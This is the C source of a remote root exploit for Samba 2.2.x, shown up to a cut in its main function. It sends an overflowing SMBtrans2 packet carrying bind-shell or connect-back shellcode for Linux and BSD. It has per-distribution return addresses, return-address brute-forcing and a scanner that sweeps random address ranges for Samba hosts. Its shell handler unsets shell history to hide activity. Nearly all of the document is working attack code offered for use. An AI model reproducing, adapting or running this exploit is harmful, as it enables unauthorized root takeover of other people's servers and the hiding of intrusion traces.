/*
    Remote root exploit for Samba 2.2.x and prior that works against
    Linux (all distributions), FreeBSD (4.x, 5.x), NetBSD (1.x) and
    OpenBSD (2.x, 3.x and 3.2 non-executable stack).
    sambal.c is able to identify samba boxes. It will send a netbios
    name packet to port 137. If the box responds with the mac address
    00-00-00-00-00-00, it's probally running samba.

    [esdee@embrace esdee]$ ./sambal -d 0 -C 60 -S 192.168.0
    samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
    --------------------------------------------------------------
    + Scan mode.
    + [192.168.0.3] Samba
    + [192.168.0.10] Windows
    + [192.168.0.20] Windows
    + [192.168.0.21] Samba
    + [192.168.0.30] Windows
    + [192.168.0.31] Samba
    + [192.168.0.33] Windows
    + [192.168.0.35] Windows
    + [192.168.0.36] Windows
    + [192.168.0.37] Windows
    ...
    + [192.168.0.133] Samba

    Great!
    You could now try a preset (-t0 for a list), but most of the
    time bruteforce will do. The smbd spawns a new process on every
    connect, so we can bruteforce the return address...

    [esdee@embrace esdee]$ ./sambal -b 0 -v 192.168.0.133
    samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
    --------------------------------------------------------------
    + Verbose mode.
    + Bruteforce mode. (Linux)
    + Using ret: [0xbffffed4]
    + Using ret: [0xbffffda8]
    + Using ret: [0xbffffc7c]
    + Using ret: [0xbffffb50]
    + Using ret: [0xbffffa24]
    + Using ret: [0xbffff8f8]
    + Using ret: [0xbffff7cc]
    + Worked!
    --------------------------------------------------------------
  Linux LittleLinux.selwerd.lan 2.4.18-14 #1 Wed Sep 4 11:57:57 EDT 2002 i586
 i586 i386 GNU/Linux
    uid=0(root) gid=0(root) groups=99(nobody)

sambal.c : samba-2.2.8 < remote root exploit by eSDee (www.netric.org|

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

typedef struct {
        unsigned char type;
        unsigned char flags;
        unsigned short length;
} NETBIOS_HEADER;

typedef struct {
        unsigned char protocol[4];
        unsigned char command;
        unsigned short status;
        unsigned char reserved;
        unsigned char  flags;
        unsigned short flags2;
        unsigned char  pad[12];
        unsigned short tid;
        unsigned short pid;
        unsigned short uid;
        unsigned short mid;
} SMB_HEADER;

int OWNED = 0;
pid_t childs[100];
struct sockaddr_in addr1;
struct sockaddr_in addr2;

char linux_bindcode[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc1\x31\xc0\x31\xdb\x50\x50"
        "\x50\x66\x68\xb0\xef\xb3\x02\x66\x53\x89\xe2\xb3\x10\x53\xb3\x02"
        "\x52\x51\x89\xca\x89\xe1\xb0\x66\xcd\x80\x31\xdb\x39\xc3\x74\x05"
        "\x31\xc0\x40\xcd\x80\x31\xc0\x50\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
        "\x80\x89\xd7\x31\xc0\x31\xdb\x31\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
        "\x80\x31\xc0\x31\xdb\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
        "\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80\x39\xc3\x75\x40\x31\xc0"
        "\x89\xfb\xb0\x06\xcd\x80\x31\xc0\x31\xc9\x89\xf3\xb0\x3f\xcd\x80"
        "\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0"
        "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8b\x54\x24"
        "\x08\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x31\xc0"
        "\x89\xf3\xb0\x06\xcd\x80\xeb\x99";

char bsd_bindcode[] =
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0"
        "\x61\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\xb0\xef\xb7\x02"
        "\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80"
        "\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x50\x57"
        "\x50\xb0\x6a\xcd\x80\x31\xc0\x31\xdb\x50\x89\xe1\xb3\x01\x53\x89"
        "\xe2\x50\x51\x52\xb3\x14\x53\x50\xb0\x2e\xcd\x80\x31\xc0\x50\x50"
        "\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
        "\x39\xc3\x75\x44\x31\xc0\x57\x50\xb0\x06\xcd\x80\x31\xc0\x50\x56"
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x56\x50\xb0\x5a\xcd"
        "\x80\x31\xc0\x43\x53\x56\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x2f"
        "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b"
        "\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x56\x50\xb0\x06\xcd\x80"
        "\xeb\x9a";

char linux_connect_back[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";

char bsd_connect_back[] =
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0"
        "\x61\xcd\x80\x31\xd2\x52\x52\x68\x41\x41\x41\x41\x66\x68\xb0\xef"
        "\xb7\x02\x66\x53\x89\xe1\xb2\x10\x52\x51\x50\x52\x89\xc2\x31\xc0"
        "\xb0\x62\xcd\x80\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\x50\x52\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x52"
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x43\x53\x52\x50\xb0\x5a\xcd\x80\x31"
        "\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54"
        "\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";



struct {
        char *type;
        unsigned long ret;
        char *shellcode;
        int os_type;    /* 0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD non-exec stack */

} targets[] = {
        { "samba-2.2.x - Debian 3.0           ", 0xbffffea2, linux_bindcode, 0 },
        { "samba-2.2.x - Gentoo 1.4.x         ", 0xbfffe890, linux_bindcode, 0 },
        { "samba-2.2.x - Mandrake 8.x         ", 0xbffff6a0, linux_bindcode, 0 },
        { "samba-2.2.x - Mandrake 9.0         ", 0xbfffe638, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 9.0           ", 0xbffff7cc, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 8.0           ", 0xbffff2f0, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 7.x           ", 0xbffff310, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 6.x           ", 0xbffff2f0, linux_bindcode, 0 },
        { "samba-2.2.x - Slackware 9.0        ", 0xbffff574, linux_bindcode, 0 },
        { "samba-2.2.x - Slackware 8.x        ", 0xbffff574, linux_bindcode, 0 },
        { "samba-2.2.x - SuSE 7.x             ", 0xbffffbe6, linux_bindcode, 0 },
        { "samba-2.2.x - SuSE 8.x             ", 0xbffff8f8, linux_bindcode, 0 },
        { "samba-2.2.x - FreeBSD 5.0          ", 0xbfbff374, bsd_bindcode, 1 },
        { "samba-2.2.x - FreeBSD 4.x          ", 0xbfbff374, bsd_bindcode, 1 },
        { "samba-2.2.x - NetBSD 1.6           ", 0xbfbfd5d0, bsd_bindcode, 1 },
        { "samba-2.2.x - NetBSD 1.5           ", 0xbfbfd520, bsd_bindcode, 1 },
        { "samba-2.2.x - OpenBSD 3.2          ", 0x00159198, bsd_bindcode, 2 },
        { "samba-2.2.8 - OpenBSD 3.2 (package)", 0x001dd258, bsd_bindcode, 2 },
        { "samba-2.2.7 - OpenBSD 3.2 (package)", 0x001d9230, bsd_bindcode, 2 },
        { "samba-2.2.5 - OpenBSD 3.2 (package)", 0x001d6170, bsd_bindcode, 2 },
        { "Crash (All platforms)              ", 0xbade5dee, linux_bindcode, 0 },
};

void shell();
void usage();
void handler();

int is_samba(char *ip, unsigned long time_out);
int Connect(int fd, char *ip, unsigned int port, unsigned int time_out);
int read_timer(int fd, unsigned int time_out);
int write_timer(int fd, unsigned int time_out);
int start_session(int sock);
int exploit_normal(int sock, unsigned long ret, char *shellcode);
int exploit_openbsd32(int sock, unsigned long ret, char *shellcode);

void usage(char *prog)
{
        fprintf(stderr, "Usage: %s [-bBcCdfprsStv] [host]\n\n"
                        "-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n"
                        "-B <step>       bruteforce steps (default = 300)\n"
                        "-c <ip address> connectback ip address\n"
                        "-C <max childs> max childs for scan/bruteforce mode (default = 40)\n"
                        "-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)\n"
                        "-f              force\n"
                        "-p <port>       port to attack (default = 139)\n"
                        "-r <ret>        return address\n"
                        "-s              scan mode (random)\n"
                        "-S <network>    scan mode\n"
                        "-t <type>       presets (0 for a list)\n"
                        "-v              verbose mode\n\n", prog);

        exit(1);
}

int is_samba(char *ip, unsigned long time_out)
{
        char
        nbtname[]= /* netbios name packet */
        {
                0x80,0xf0,0x00,0x10,0x00,0x01,0x00,0x00,
                0x00,0x00,0x00,0x00,0x20,0x43,0x4b,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x00,0x00,0x21,
                0x00,0x01
        };

        unsigned char recv_buf[1024];
        unsigned char *ptr;

        int i = 0;
        int s = 0;

        unsigned int total = 0;

        if ((s = socket(PF_INET, SOCK_DGRAM, 17)) <= 0) return -1;

        if(Connect(s, ip, 137, time_out) == -1) {
                close(s);
                return -1;
        }

        memset(recv_buf, 0x00, sizeof(recv_buf));

        if(write_timer(s, time_out) == 1) {
                if (write(s, nbtname, sizeof(nbtname)) <= 0) {
                        close(s);
                        return -1;
                }
        }

        if (read_timer(s, time_out) == 1) {
                if (read(s, recv_buf, sizeof(recv_buf)) <= 0) {
                        close(s);
                        return -1;
                }

                ptr = recv_buf + 57;
                total = *(ptr - 1); /* max names */

                while(ptr < recv_buf + sizeof(recv_buf)) {
                        ptr += 18;
                        if (i == total) {

                                ptr -= 19;

                                if ( *(ptr + 1) == 0x00 && *(ptr + 2) == 0x00 && *(ptr + 3) == 0x00 &&
                                     *(ptr + 4) == 0x00 && *(ptr + 5) == 0x00 && *(ptr + 6) == 0x00) {
                                        close(s);
                                        return 0;
                                }

                                close(s);
                                return 1;
                        }

                        i++;
                }

        }
        close(s);
        return -1;
}

int Connect(int fd, char *ip, unsigned int port, unsigned int time_out)
{
        /* ripped from no1 */

        int                      flags;
        int                      select_status;
        fd_set                   connect_read, connect_write;
        struct timeval           timeout;
        int                      getsockopt_length = 0;
        int                      getsockopt_error = 0;
        struct sockaddr_in       server;
        bzero(&server, sizeof(server));
        server.sin_family = AF_INET;
        inet_pton(AF_INET, ip, &server.sin_addr);
        server.sin_port = htons(port);

        if((flags = fcntl(fd, F_GETFL, 0)) < 0) {
                close(fd);
                return -1;
        }

        if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
                close(fd);
                return -1;
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;
        FD_ZERO(&connect_read);
        FD_ZERO(&connect_write);
        FD_SET(fd, &connect_read);
        FD_SET(fd, &connect_write);

        if((connect(fd, (struct sockaddr *) &server, sizeof(server))) < 0) {
                if(errno != EINPROGRESS) {
                        close(fd);
                        return -1;
                }
        }
        else {
                if(fcntl(fd, F_SETFL, flags) < 0) {
                        close(fd);
                        return -1;
                }

                return 1;

        }

        select_status = select(fd + 1, &connect_read, &connect_write, NULL, &timeout);

        if(select_status == 0) {
                close(fd);
                return -1;

        }

        if(select_status == -1) {
                close(fd);
                return -1;
        }

        if(FD_ISSET(fd, &connect_read) || FD_ISSET(fd, &connect_write)) {
                if(FD_ISSET(fd, &connect_read) && FD_ISSET(fd, &connect_write))
 {
                        getsockopt_length = sizeof(getsockopt_error);

                        if(getsockopt(fd, SOL_SOCKET, SO_ERROR, &getsockopt_error, &getsockopt_length) < 0) {
                                errno = ETIMEDOUT;
                                close(fd);
                                return -1;
                        }

                        if(getsockopt_error == 0) {
                                if(fcntl(fd, F_SETFL, flags) < 0) {
                                        close(fd);
                                        return -1;
                                }
                                return 1;
                        }

                        else {
                                errno = getsockopt_error;
                                close(fd);
                                return (-1);
                                }

                        }
                }
        else {
                close(fd);
                return 1;
        }

        if(fcntl(fd, F_SETFL, flags) < 0) {
                close(fd);
                return -1;
        }
        return 1;
}

int read_timer(int fd, unsigned int time_out)
{

        /* ripped from no1 */

        int                      flags;
        int                      select_status;
        fd_set                   fdread;
        struct timeval           timeout;

        if((flags = fcntl(fd, F_GETFL, 0)) < 0) {
                close(fd);
                return (-1);
        }

        if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
                close(fd);
                return (-1);
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;
        FD_ZERO(&fdread);
        FD_SET(fd, &fdread);
        select_status = select(fd + 1, &fdread, NULL, NULL, &timeout);

        if(select_status == 0) {
                close(fd);
                return (-1);
        }

        if(select_status == -1) {
                close(fd);
                return (-1);
        }

        if(FD_ISSET(fd, &fdread)) {

                if(fcntl(fd, F_SETFL, flags) < 0) {
                        close(fd);
                        return -1;
                }

                return 1;

        }
        else {
                close(fd);
                return 1;

        }
}

int write_timer(int fd, unsigned int time_out)
{

        /* ripped from no1 */

        int                      flags;
        int                      select_status;
        fd_set                   fdwrite;
        struct timeval           timeout;

        if((flags = fcntl(fd, F_GETFL, 0)) < 0) {
                close(fd);
                return (-1);
        }

        if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
                close(fd);
                return (-1);
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;
        FD_ZERO(&fdwrite);
        FD_SET(fd, &fdwrite);

        select_status = select(fd + 1, NULL, &fdwrite, NULL, &timeout);

        if(select_status == 0) {
                close(fd);
                return -1;
        }

        if(select_status == -1) {
                close(fd);
                return -1;
        }

        if(FD_ISSET(fd, &fdwrite)) {
                if(fcntl(fd, F_SETFL, flags) < 0) {
                        close(fd);
                        return -1;
                }
                return 1;
        }
        else {
                close(fd);
                return -1;
        }
}


void shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="unset HISTFILE; echo \"*** JE MOET JE MUIL HOUWE\";uname -a;id;\n";
        int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock,&fd_read);
                FD_SET(0,&fd_read);

                if (select(FD_SETSIZE, &fd_read, NULL, NULL, NULL) < 0 ) break;

                if (FD_ISSET(sock, &fd_read)) {

                        if((n = recv(sock, buff, sizeof(buff), 0)) < 0){
                                fprintf(stderr, "EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) < 0) break;
                }

                if (FD_ISSET(0, &fd_read)) {

                        if((n = read(0, buff, sizeof(buff))) < 0){
                                fprintf(stderr, "EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) < 0) break;
                }

                usleep(10);
        }

        fprintf(stderr, "Connection lost.\n\n");
        exit(0);
}

void handler()
{
        int sock = 0;
        int i = 0;
        OWNED = 1;

        for (i = 0; i < 100; i++)
                if (childs[i] != 0xffffffff) waitpid(childs[i], NULL, 0);

        if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
                close(sock);
                exit(1);
        }

        if(Connect(sock, (char *)inet_ntoa(addr1.sin_addr), 45295, 2) != -1) {
                fprintf(stdout, "+ Worked!\n"
                                "--------------------------------------------------------------\n");
                shell(sock);
                close(sock);
        }


}

int start_session(int sock)
{
        char buffer[1000];
        char response[4096];
        char session_data1[]    = "\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00";
        char session_data2[]    = "\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64\x79"
                                  "\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";

        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader->type     = 0x00;         /* session message */
        netbiosheader->flags    = 0x00;
        netbiosheader->length   = htons(0x2E);

        smbheader->protocol[0]  = 0xFF;
        smbheader->protocol[1]  = 'S';
        smbheader->protocol[2]  = 'M';
        smbheader->protocol[3]  = 'B';
        smbheader->command      = 0x73;         /* session setup */
        smbheader->flags        = 0x08;         /* caseless pathnames */
        smbheader->flags2       = 0x01;         /* long filenames supported */
        smbheader->pid          = getpid() & 0xFFFF;
        smbheader->uid          = 100;
        smbheader->mid          = 0x01;

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data1, sizeof(session_data1) - 1);

        if(write_timer(sock, 3) == 1)
                if (send(sock, buffer, 50, 0) < 0) return -1;

        memset(response, 0x00, sizeof(response));

        if (read_timer(sock, 3) == 1)
                if (read(sock, response, sizeof(response) - 1) < 0) return -1;

        netbiosheader = (NETBIOS_HEADER *)response;
        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));

        if (netbiosheader->type != 0x00) fprintf(stderr, "+ Recieved a non session message\n");

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader->type     = 0x00;         /* session message */
        netbiosheader->flags    = 0x00;
        netbiosheader->length   = htons(0x3C);

        smbheader->protocol[0]  = 0xFF;
        smbheader->protocol[1]  = 'S';
        smbheader->protocol[2]  = 'M';
        smbheader->protocol[3]  = 'B';
        smbheader->command      = 0x70;         /* start connection */
        smbheader->pid          = getpid() & 0xFFFF;
        smbheader->tid          = 0x00;
        smbheader->uid          = 100;

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data2, sizeof(session_data2) - 1);

        if(write_timer(sock, 3) == 1)
                if (send(sock, buffer, 64, 0) < 0) return -1;

        memset(response, 0x00, sizeof(response));

        if (read_timer(sock, 3) == 1)
                if (read(sock, response, sizeof(response) - 1) < 0) return -1;

        netbiosheader = (NETBIOS_HEADER *)response;
        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));

        if (netbiosheader->type != 0x00) return -1;

        return 0;
}

int exploit_normal(int sock, unsigned long ret, char *shellcode)
{

        char buffer[4000];
        char exploit_data[] =
                "\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x90";

        int i = 0;
        unsigned long dummy = ret - 0x90;

        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader->type             = 0x00;         /* session message */
        netbiosheader->flags            = 0x04;
        netbiosheader->length           = htons(2096);

        smbheader->protocol[0]          = 0xFF;
        smbheader->protocol[1]          = 'S';
        smbheader->protocol[2]          = 'M';
        smbheader->protocol[3]          = 'B';
        smbheader->command              = 0x32;         /* SMBtrans2 */
        smbheader->tid                  = 0x01;
        smbheader->uid                  = 100;

        memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);

        buffer[1096] = 0xEB;
        buffer[1097] = 0x70;

        for (i = 0; i < 4 * 24; i += 8) {
                memcpy(buffer + 1099 + i, &dummy, 4);
                memcpy(buffer + 1103 + i, &ret,   4);
        }

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),
                        exploit_data, sizeof(exploit_data) - 1);
        memcpy(buffer + 1800, shellcode, strlen(shellcode));

        if(write_timer(sock, 3) == 1) {
                if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;
                return 0;
        }

        return -1;
}

int exploit_openbsd32(int sock, unsigned long ret, char *shellcode)
{
        char buffer[4000];

        char exploit_data[] =
                "\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x90";

        int i = 0;
        unsigned long dummy = ret - 0x30;
        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader->type             = 0x00;         /* session message */
        netbiosheader->flags            = 0x04;
        netbiosheader->length           = htons(2096);

        smbheader->protocol[0]          = 0xFF;
        smbheader->protocol[1]          = 'S';
        smbheader->protocol[2]          = 'M';
        smbheader->protocol[3]          = 'B';
        smbheader->command              = 0x32;         /* SMBtrans2 */
        smbheader->tid                  = 0x01;
        smbheader->uid                  = 100;

        memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);

        for (i = 0; i < 4 * 24; i += 4)
                memcpy(buffer + 1131 + i, &dummy, 4);

        memcpy(buffer + 1127, &ret,      4);

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),
                        exploit_data, sizeof(exploit_data) - 1);

        memcpy(buffer + 1100 - strlen(shellcode), shellcode, strlen(shellcode));

        if(write_timer(sock, 3) == 1) {
                if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;
                return 0;
        }

        return -1;
}


int main (int argc,char *argv[])
{
        char *shellcode = NULL;
        char scan_ip[256];

        int brute       = -1;
        int connectback = 0;
        int force       = 0;
        int i           = 0;
        int ip1         = 0;
        int ip2         = 0;
        int ip3         = 0;
        int ip4         = 0;
        int opt         = 0;
        int port        = 139;
        int random      = 0;
        int scan        = 0;
        int sock        = 0;
        int sock2       = 0;
        int status      = 0;
        int type        = 0;
        int verbose     = 0;

        unsigned long BRUTE_DELAY       = 100000;
        unsigned long ret               = 0x0;
        unsigned long MAX_CHILDS        = 40;
        unsigned long STEPS             = 300;

        struct hostent          *he;

        fprintf(stdout, "samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)\n"
                        "--------------------------------------------------------------\n");

        while((opt = getopt(argc,argv,"b:B:c:C:d:fp:r:sS:t:v")) !=EOF) {
                switch(opt)
                {
                        case 'b':
                                brute = atoi(optarg);
                                if ((brute < 0) || (brute > 3)) {
                                        fprintf(stderr, "Invalid platform.\n\n");
                                        return -1;
                                }
                                break;
                        case 'B':
                                STEPS = atoi(optarg);
                                if (STEPS == 0) STEPS++;
                                break;
                        case 'c':
                                sscanf(optarg, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
                                connectback = 1;

                                if (ip1 == 0 || ip2 == 0 || ip3 == 0 || ip4 == 0) {
                                        fprintf(stderr, "Invalid IP address.\n\n");
                                        return -1;
                                }

                                linux_connect_back[33] = ip1; bsd_connect_back[24] = ip1;
                                linux_connect_back[34] = ip2; bsd_connect_back[25] = ip2;
                                linux_connect_back[35] = ip3; bsd_connect_back[26] = ip3;
                                linux_connect_back[36] = ip4; bsd_connect_back[27] = ip4;

                                break;
                        case 'C':
                                MAX_CHILDS = atoi(optarg);
                                if (MAX_CHILDS == 0) {
                                        fprintf(stderr, "Invalid number of childs.\n");
                                        return -1;
                                }

                                if (MAX_CHILDS > 99) {
                                        fprintf(stderr, "Too many childs, using 99. \n");
                                        MAX_CHILDS = 99;
                                }

                                break;
                        case 'd':
                                BRUTE_DELAY = atoi(optarg);
                                break;
                        case 'f':
                                force = 1;
                                break;
                        case 'p':
                                port = atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr, "Invalid port.\n\n");
                                        return -1;
                                }
                                break;
                        case 'r':
                                ret = strtoul(optarg, &optarg, 16);
                                break;
                        case 's':
                                random  = 1;
                                scan    = 1;
                                break;
                        case 'S':
                                random  = 0;
                                scan    = 1;
                                sscanf(optarg, "%d.%d.%d", &ip1, &ip2, &ip3);
                                ip3--;
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 16) {
                                        for(i = 0; i < sizeof(targets) / 16; i++)
                                                fprintf(stdout, "%02d. %s  [0x%08x]\n", i + 1, targets[i].type, (unsigned int) targets[i].ret);
                                        fprintf(stderr, "\n");
                                        return -1;
                                }
                                break;
                        case 'v':
                                verbose = 1;
                                break;
                        default:
                                usage(argv[0] == NULL ? "sambal" : argv[0]);
                                break;
                }

        }

        if ((argv[optind] == NULL && scan == 0) || (type == 0 && brute == -1 && scan == 0))
                usage(argv[0] == NULL ? "sambal" : argv[0]);

        if (scan == 1)
                fprintf(stdout, "+ Scan mode.\n");
        if (verbose == 1)
                fprintf(stdout, "+ Verbose mode.\n");

        if (scan == 1) {

                srand(getpid());

                while (1) {

                        if (random == 1) {
                                ip1 = rand() % 255;
                                ip2 = rand() % 255;
                                ip3 = rand() % 255; }
                        else {
                                ip3++;
                                if (ip3 > 254) { ip3 = 1; ip2++; }
                                if (ip2 > 254) { ip2 = 1; ip1++; }
                                if (ip1 > 254) exit(0);
                        }

                        for (ip4 = 0; ip4 < 255; ip4++) {
                                i++;
                                snprintf(scan_ip, sizeof(scan_ip) - 1, "%u.%u.%u.%u", ip1, ip2, ip3, ip4);
                                usleep(BRUTE_DELAY);

                                switch (fork()) {
                                        case 0:
                                                switch(is_samba(scan_ip, 2)) {
                                                        case 0:
                                                                fprintf(stdout, "+ [%s] Samba\n", scan_ip);
                                                                break;
                                                        case 1:
                                                                fprintf(stdout, "+ [%s] Windows\n", scan_ip);
                                                                break;
                                                        default:
                                                                break;
                                                }

                                                exit(0);
                                                break;
                                        case -1:
                                                fprintf(stderr, "+ fork() error\n");
                                                exit(-1);
                                                break;
                                        default:
                                                if (i > MAX_CHILDS - 2) {
                                                        wait(&status);
                                                        i--;
                                                }
                                                break;
                                }
                        }

                }

                return 0;
        }


        he = gethostbyname(argv[optind]);

        if (he == NULL) {
                fprintf(stderr, "Unable to resolve %s...\n", argv[optind]);
                return -1;
        }

        if (brute == -1) {

                if (ret == 0) ret = targets[type - 1].ret;

                shellcode = targets[type - 1].shellcode;

                if (connectback == 1) {
                        fprintf(stdout, "+ connecting back to: [%d.%d.%d.%d:45295]\n",
                                        ip1, ip2, ip3, ip4);

                        switch(targets[type - 1].os_type) {
                                case 0: /* linux */
                                        shellcode = linux_connect_back;
                                        break;
                                case 1: /* FreeBSD/NetBSD */
                                        shellcode = bsd_connect_back;
                                        break;
                                case 2: /* OpenBSD */
                                        shellcode = bsd_connect_back;
                                        break;
                                case 3: /* OpenBSD 3.2 Non-exec stack */
                                        shellcode = bsd_connect_back;
                                        break;
                        }

                }

                if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
                        fprintf(stderr, "+ socket() error.\n");
                        return -1;
                }

                if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
                        fprintf(stderr, "+ socket() error.\n");
                        return -1;
                }

                memcpy(&addr1.sin_addr, he->h_addr, he->h_length);
                memcpy(&addr2.sin_addr, he->h_addr, he->h_length);

                addr1.sin_family = AF_INET;
                addr1.sin_port   = htons(port);
                addr2.sin_family = AF_INET;
